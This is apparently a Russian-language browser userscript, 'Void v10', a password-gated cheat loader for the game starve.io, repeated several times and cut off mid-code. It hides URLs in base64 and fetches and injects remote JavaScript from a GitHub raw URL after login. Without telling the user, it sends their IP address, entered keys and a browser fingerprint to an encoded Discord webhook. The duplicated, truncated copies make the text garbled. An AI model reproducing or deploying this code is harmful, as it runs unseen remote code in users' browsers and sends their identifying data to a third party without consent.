                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
